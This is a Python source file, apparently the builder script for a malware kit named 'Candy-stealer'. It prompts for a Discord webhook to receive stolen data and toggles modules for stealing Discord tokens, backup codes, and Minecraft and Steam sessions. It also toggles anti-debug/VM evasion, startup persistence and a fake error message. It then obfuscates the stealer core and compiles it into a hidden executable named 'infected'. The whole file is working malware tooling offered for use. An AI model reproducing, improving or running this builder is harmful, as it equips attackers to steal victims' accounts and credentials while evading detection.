import re
import os
import ast
import random
import zlib
import base64
import subprocess
import colorama
import sys
from colorama import Fore
import pyfiglet
import datetime
import requests
import getpass
import msvcrt
from pystyle import Center
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn                                                                                                                                                                                                                                                                                                                                                                                          # Witch❤️
from rich import print as rprint
from datetime import *
from plyer import notification
# ======================================================================= #
from utils.module.Obfuscators import Obfuscators 
from utils.module.logger import log_debug, timestamp, log_warn, log_error

os.system("cls")
obf = Obfuscators(include_imports=True, recursion=2)

# =========================================================================================================================================================== #
version = "1.56.3"                                                                                                                                            #
# =========================================================================================================================================================== #
CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam", "startup", "ERROR"]                                                 #
# =========================================================================================================================================================== #
ENABLE_KEYS = ["Anti Debug / VM","Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal", "Startup", "FAKE ERROR"]
# =========================================================================================================================================================== #
PATH = "src/stealer_core/src.py"                                                                                                                              #
# =========================================================================================================================================================== #
Cloud_Version = "https://raw.githubusercontent.com/nojumpdelay/Candy-stealer/refs/heads/main/builder/raw/f556WI8VKR1eciLRFaLVhU8nC"                                    #
# =========================================================================================================================================================== #
VersionHash = requests.get(Cloud_Version)

hash_version = VersionHash.text.strip()


print(Fore.LIGHTMAGENTA_EX + Center.XCenter("""
 ██████╗ █████╗ ███╗   ██╗██████╗ ██╗   ██╗
██╔════╝██╔══██╗████╗  ██║██╔══██╗╚██╗ ██╔╝
██║     ███████║██╔██╗ ██║██║  ██║ ╚████╔╝ 
██║     ██╔══██║██║╚██╗██║██║  ██║  ╚██╔╝  
╚██████╗██║  ██║██║ ╚████║██████╔╝   ██║   
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   
"""))
print (" ")
username = getpass.getuser()

if version == hash_version:
    log_debug(f"Candy-stealer | Local Version: {version} | Cloud Version: {hash_version}")
else:
    log_warn(f"Outdated! | Local Version: {version} | Cloud Version: {hash_version}")

def Version_Checker():
    if version.endswith("-dev"):
        log_warn("You are using the Dev version!")

    if version.endswith("-test"):
      log_warn("You are using the test version!")

    if version.endswith("-py"):
      log_warn("You are using the Python Version Changed version!")

def ask_toggle(key):
    print(timestamp() + f"{Fore.LIGHTMAGENTA_EX}* {Fore.RESET}Enable {key}?:{Fore.CYAN} ", end="", flush=True)
    while True:
        if msvcrt.kbhit():
            ch = msvcrt.getch().decode("utf-8").lower()
            if ch == "y":
                print(f"{Fore.CYAN}\b\b Yes")
                return True
            elif ch == "n":
                print(f"{Fore.CYAN}\b\b No")
                return False
            else:
                log_warn("Invalid")
                print (" ")
                print(timestamp() + f"{Fore.LIGHTMAGENTA_EX}* {Fore.RESET}Enable {key}:{Fore.CYAN} ", end="", flush=True)


def ask_webhook():
    webhook_pattern = re.compile(r"^https://(canary\.|ptb\.)?(discord\.com|discordapp\.com)/api/webhooks/\d{17,20}/[A-Za-z0-9_-]{60,}")
    while True:
        val = input(f"{Fore.LIGHTMAGENTA_EX}?{Fore.RESET} Enter Your Webhook:{Fore.CYAN} ").strip()
        if webhook_pattern.match(val):
            return val
        else:
            log_warn("Invalid Webhook.")

def update_config_in_file(filepath, updated_config, webhook_url=None):
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
    except Exception as e:
        log_error(f"[File Read Error] {filepath}: {e}")
        return  

    try:
        for key, value in updated_config.items():
            content = re.sub(rf'"{key}":\s*(True|False)', f'"{key}": {value}', content)

        if webhook_url:
            content = re.sub(r'"webhook":\s*"[^"]*"', f'"webhook": \"{webhook_url}\"', content)

        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)

        log_debug("GET")
        log_debug(f"Config {Fore.WHITE}204{Fore.RESET}")
        log_debug(f" WebHook: {webhook_url}")
        for key, value in updated_config.items():
            log_debug(f"  {key}: {value}")

        if version.endswith("-dev"):
            log_debug("\n[DEV MODE] Full content preview:")
            log_debug(f"{content}")

    except Exception as e:
        log_error(f"[Update Error] Config update failed for {filepath}: {e}")
        sys.exit(1)

def build():
    url = "https://pypi.org/pypi/pyinstaller/json"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        latest_version = data["info"]["version"]
        log_debug(f"Installing Latest Build Pyinstaller | {latest_version}")
        subprocess.run(["pip", "install", f"pyinstaller=={latest_version}"], shell=True)
    else:
        log_debug("Failed to fetch PyInstaller version from PyPI, installing default...")
        subprocess.run(["pip", "install", "pyinstaller"], shell=True)

    subprocess.run(["pyinstaller", "--version"], shell=True)
    subprocess.run(["pyinstaller", "--help"], shell=True)
    log_debug("Started Build with Pyinstaller")
    subprocess.run([
        "pyinstaller", "--onefile", "--clean", "--noconsole",
        "--name=infected", "--icon=src/ico.ico", "--upx-dir=src/upx",
        "src/stealer_core/src.py"
    ], shell=True)
    log_debug("Build Finished.")
    notification.notify(
    title='Build Completed.',
    message='The build is complete, please check the dist.',
    app_name=f'Candy Stealer Builder v{version}',
    timeout=5  
)

def main():
    Version_Checker()
    config = {}
    webhook = ask_webhook()
    for key, label in zip(CONFIG_KEYS, ENABLE_KEYS):
        config[key] = ask_toggle(label)
    update_config_in_file(PATH, config, webhook)
    obf.execute(PATH)
    build()

if __name__ == "__main__":
    main()
